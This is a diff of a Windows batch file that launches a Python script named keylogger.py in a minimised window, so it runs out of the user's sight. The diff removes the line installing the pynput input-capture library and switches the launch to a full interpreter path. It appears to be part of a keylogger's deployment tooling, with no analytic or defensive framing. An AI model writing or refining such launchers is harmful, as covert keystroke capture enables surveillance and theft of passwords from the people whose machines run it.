@@ -1,3 +1,3 @@
 @echo off
-pip install pynput
-start /min python keylogger.py
+
+start /min  C:\Python\python keylogger.py
